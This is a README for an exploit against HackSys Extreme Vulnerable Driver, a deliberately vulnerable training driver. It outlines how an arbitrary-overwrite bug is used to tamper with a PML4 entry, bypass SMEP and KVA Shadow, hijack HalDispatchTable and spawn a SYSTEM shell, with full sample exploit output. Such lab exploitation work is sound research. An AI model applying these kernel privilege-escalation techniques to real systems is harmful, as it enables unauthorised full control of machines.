# HackSys Extreme Vulnerable Driver (HEVD) - Arbitrary Overwrite Exploit

## Introduction

This repository contains an exploit for [HackSys Extreme Vulnerable Driver (HEVD)](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver) that bypasses KVA Shadow, a mitigation for the Meltdown vulnerability.


## Exploit Overview

Leveraging [an arbitrary overwrite vulnerability in HEVD](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/blob/b02b6ea/Driver/HEVD/Windows/ArbitraryWrite.c#L112), this exploit modifies PML4 entry to bypass both KVA Shadow and SMEP.


## Tested Environment

The exploit has been tested in the following environment:

- Windows 10 Version 22H2 (OS Build 19045.3930)
- KVA Shadow enabled
- VBS/HVCI disabled


Below is a sample output from executing the exploit:

```
C:\Users\debuggee>HEVD_ArbitraryOverwrite.exe
HackSys Extreme Vulnerable Driver (HEVD) - Arbitrary Overwrite Exploit
Windows 10 Version 22H2 (OS Build 19045.3930) with KVA Shadow enabled
-----

[*] Executable shellcode: 000002846A110000
[+] HEVD device handle: 0000000000000098
[+] Kernel base address: FFFFF80560A00000
[+] NtQueryIntervalProfile: 00007FF8C704FA00

[*] Leaking virtual address of shellcode's PML4 entry...
[!] Writing: *(000000BF51BBFC60) = *(FFFFF80560C6B573)
[*] Leaked PTE virtual address: FFFF940000000000
[*] Extracted PML4 Self Reference Entry index: 128
[*] Extracted shellcode's PML4 index: 005
[*] Calculated virtual address for shellcode's PML4 entry: FFFF944A25128028

[*] Modifying shellcode's PML4 entry to bypass SMEP and KVA Shadow...
[!] Writing: *(000000BF51BBFC70) = *(FFFF944A25128028)
[*] Leaked shellcode's PML4 entry: 8A0000015F3D5867
[*] Modified shellcode's PML4 entry: 0A0000015F3D5863
[!] Writing: *(FFFF944A25128028) = *(000000BF51BBFCB8)
[*] Overwrote PML4 entry to make shellcode executable in kernel mode

[*] Modifying HalDispatchTable+0x8 for shellcode execution...
[!] Writing: *(000000BF51BBFC70) = *(FFFFF80561600A68)
[*] Leaked HalDispatchTable+0x8: FFFFF80561392EF0
[!] Writing: *(FFFFF80561600A68) = *(000000BF51BBFCE0)
[*] Overwrote HalDispatchTable+0x8 to gain control flow

[*] Executing shellcode...
[*] Executable SetR13 function allocated at: 000002846A240000
[*] Setting R13 to shellcode's address
[*] Calling NtQueryIntervalProfile to execute shellcode

[*] Restoring the kernel state...
[!] Writing: *(FFFF944A25128028) = *(000000BF51BBFCF8)
[!] Writing: *(FFFFF80561600A68) = *(000000BF51BBFD00)

[+] Spawning a shell with SYSTEM privilege
```

```
Microsoft Windows [Version 10.0.19045.3930]
(c) Microsoft Corporation. All rights reserved.

C:\Users\debuggee>whoami
nt authority\system
```


## Verifying KVA Shadow Status

Use [SpecuCheck](https://github.com/ionescu007/SpecuCheck) to verify if KVA Shadow is active on your system:

```
C:\Users\debuggee>SpecuCheck.exe
SpecuCheck v1.1.1    --   Copyright(c) 2018 Alex Ionescu
https://ionescu007.github.io/SpecuCheck/  --   @aionescu
--------------------------------------------------------

Mitigations for CVE-2017-5754 [rogue data cache load]
--------------------------------------------------------
[-] Kernel VA Shadowing Enabled:                    yes
...
```
